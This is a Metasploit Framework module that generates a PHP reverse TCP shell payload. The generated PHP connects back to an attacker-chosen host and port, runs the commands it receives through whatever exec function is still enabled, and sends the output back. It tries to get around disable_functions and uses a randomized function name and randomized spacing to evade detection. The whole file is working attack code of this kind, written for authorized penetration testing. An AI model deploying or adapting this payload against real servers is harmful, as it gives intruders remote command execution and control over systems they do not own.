##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/payload/php'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Php
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'PHP Command Shell, Reverse TCP (via PHP)',
      'Description'   => 'Reverse PHP connect back shell with checks for disabled functions',
      'Author'        => 'egypt',
      'License'       => BSD_LICENSE,
      'Platform'      => 'php',
      'Arch'          => ARCH_PHP,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Issues
  #   - Since each command is executed in a new shell, 'cd' does nothing.
  #      Perhaps it should be special-cased to call chdir()
  #   - Tries to get around disable_functions but makes no attempts to
  #      circumvent safe mode.
  #
  def php_reverse_shell

    if (!datastore['LHOST'] or datastore['LHOST'].empty?)
      # datastore is empty on msfconsole startup
      ipaddr = '127.0.0.1'
      port = 4444
    else
      ipaddr = datastore['LHOST']
      port = datastore['LPORT']
    end
    exec_funcname = Rex::Text.rand_text_alpha(rand(10)+5)

    uri = "tcp://#{ipaddr}"
    socket_family = "AF_INET"

    if Rex::Socket.is_ipv6?(ipaddr)
      uri = "tcp://[#{ipaddr}]"
      socket_family = "AF_INET6"
    end

    shell=<<-END_OF_PHP_CODE
    $ipaddr='#{ipaddr}';
    $port=#{port};
    #{php_preamble({:disabled_varname => "$dis"})}

    if(!function_exists('#{exec_funcname}')){
      function #{exec_funcname}($c){
        global $dis;
        #{php_system_block({:cmd_varname => "$c", :disabled_varname => "$dis", :output_varname => "$o"})}
        return $o;
      }
    }
    $nofuncs='no exec functions';
    if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
      $s=@fsockopen("#{uri}",$port);
      while($c=fread($s,2048)){
        $out = '';
        if(substr($c,0,3) == 'cd '){
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        }else{
          $out=#{exec_funcname}(substr($c,0,-1));
          if($out===false){
            fwrite($s,$nofuncs);
            break;
          }
        }
        fwrite($s,$out);
      }
      fclose($s);
    }else{
      $s=@socket_create(#{socket_family},SOCK_STREAM,SOL_TCP);
      @socket_connect($s,$ipaddr,$port);
      @socket_write($s,"socket_create");
      while($c=@socket_read($s,2048)){
        $out = '';
        if(substr($c,0,3) == 'cd '){
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        }else{
          $out=#{exec_funcname}(substr($c,0,-1));
          if($out===false){
            @socket_write($s,$nofuncs);
            break;
          }
        }
        @socket_write($s,$out,strlen($out));
      }
      @socket_close($s);
    }
    END_OF_PHP_CODE

    # randomize the spaces a bit
    Rex::Text.randomize_space(shell)

    return shell
  end

  #
  # Constructs the payload
  #
  def generate
    return super + php_reverse_shell
  end

end
